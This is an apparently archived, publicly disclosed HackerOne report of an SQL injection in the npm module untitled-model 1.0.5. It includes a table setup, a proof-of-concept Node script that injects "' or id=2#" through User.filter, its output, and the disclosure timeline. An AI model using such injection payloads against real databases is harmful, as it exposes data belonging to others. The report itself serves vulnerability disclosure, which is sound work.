---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/sql-injection
  - env/web
  - stack/node
substate: "resolved"
weakness: "SQL Injection"
enriched: true
body: true
date: 2019-06-18
submitted: 2019-03-09T20:00:10.397Z
bounty_usd: null
votes: 14
cve: []
program: "[[programs/nodejs-ecosystem|Node.js third-party modules]]"
reporter: "verichains"
source: "https://hackerone.com/reports/507222"
title: "[untitled-model] sql injection"
---
# [untitled-model] sql injection

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 14 | **Program:** Node.js third-party modules | **Disclosed:** 2019-06-18

- Report: [https://hackerone.com/reports/507222](https://hackerone.com/reports/507222)
- CWE: SQL Injection
- Submitted: 2019-03-09T20:00:10.397Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

I would like to report [VULNERABILITY] in [MODULE]
It allows [DESCRIBE THE IMPACT OF THE VULNERABILITY - E.G READ ARBITRARY FILES, READ DATA FROM DATABASE ETC]

# Module

**module name:** untitled-model
**version:** 1.0.5
**npm page:** `https://www.npmjs.com/package/untitled-model`

## Module Description

  Rapid sql query generator extention for [node](http://nodejs.org).
  
  [![NPM Version][npm-image]][npm-url] [![NPM Downloads][downloads-image]][downloads-url]


- [Installation](#installation)
- [Features](#features)
- [Quick Start](#quick-start)
- [Model](#user-model-:)
- [Foreign Key](#foreign-key)
- [Functions](#features)
    - [filter()](#user.filter(callback)-``requires-sql-connection``)
    - [values()](#user.values(['attr'])-``sql-projection``)
    - [all(callback)](#user.all(callback)-``requires-sql-connection``)
    - [update(callback)](#update({})-``returns-model``)
- [model](#user-=--model.get('user'))

## Module Stats

> Replace stats below with numbers from npm’s module page:

8 downloads in the last week
17 downloads in the last month

# Vulnerability

## Vulnerability Description

Multiple sql injections problems due to unescaped input usage.

## Steps To Reproduce:

- install the module `yarn add untitled-model`
- setup db:
```mysql
CREATE TABLE `user` (
  `id` int(11) NOT NULL,
  `firstName` varchar(255) NOT NULL,
  `lastName` varchar(255) NOT NULL,
  `age` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
INSERT INTO `user` (`id`, `firstName`, `lastName`, `age`) VALUES
(1, 'Timber', 'Saw', 25),
(2, 'Timber 0', 'Saw', 25);
```

- run the poc script:
```js
var model = require('untitled-model');
model.connection(
	{   
		host: "localhost",
		user: "root",
		password: "",
		database:"test"
	}
);
var User = model.get('user');
//User.all((err,data)=>{
//	console.log(err,data);
//})

(async () => {
	await new Promise((resolve,reject)=>{
		User.filter({'id': 1},function(err,data){
			if(err) throw err;
			console.log('normal query', data);
			resolve();
		});
	});
	await new Promise((resolve,reject)=>{
		User.filter({'id': "' or id=2#"},function(err,data){
			if(err) throw err;
			console.log('sqli query', data);
			resolve();
		});
	});
	process.exit(0);
})()
```

Output:
```js
normal query [ RowDataPacket { id: 1, firstName: 'Timber', lastName: 'Saw', age: 25 } ]
sqli query [ RowDataPacket { id: 2, firstName: 'Timber 0', lastName: 'Saw', age: 25 } ]
```

## Supporting Material/References:

> State all technical information about the stack where the vulnerability was found

MacOS
8.12.0
6.4.1

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N]

## Impact

Sql injection.

## Timeline

- **Report Filed**
- **2019-03-09** @api_xmgchqhv69rw1zem6733xop0tz: Hello,
Thanks for reporting this to us. Someone will quickly look at this report and triage it.
- **2019-03-09** @verichains: Hi somehow the poc script is messed up and i cannot edit the message, i'll repost it here:
```js
var model = require('untitled-model');
model.connection(
	{   
		host: "localhost",
		user: "root",
		password: "",
		database:"test"
	}
);
var User = model.get('user');

(async () => {
	await new Promise((resolve,reject)=>{
		User.filter({'id': 1},function(err,data){
			if(err) throw err;
			console.log('normal query', data);
			resolve();
		});
	});
	await new Promise((resolve,reject)=>{
		User.filter({'id': "' or id=2#"},function(err,data){
			if(err) throw err;
			console.log('sqli query', data);
			resolve();
		});
	});
	process.exit(0);
})()
```
- **Report Triaged**
- **2019-03-11** @verichains: Thank you @marcinhoppe!
- **2019-03-31** @verichains: @marcinhoppe any update?
- **2019-04-01** @ronperris: @verichains 

The maintainers have not joined this issue here yet. 

This project doesn't appear to have GitHub, or we would recommend opening an issue there.

Since this library has 0 downloads a week, it might not be very active.

We will disclose the vulnerability publicly after 45 days.
- **2019-04-01** @verichains: @ronperris Thanks for update
- **2019-05-31** @verichains: hi it's 3 months now.
- **2019-06-18** @marcinhoppe: @verichains @ronperris I am sorry for the delay on my part. I will proceed with the disclosure.
- **Report Resolved**
- **Agreed On Going Public**
- **Manually Disclosed**
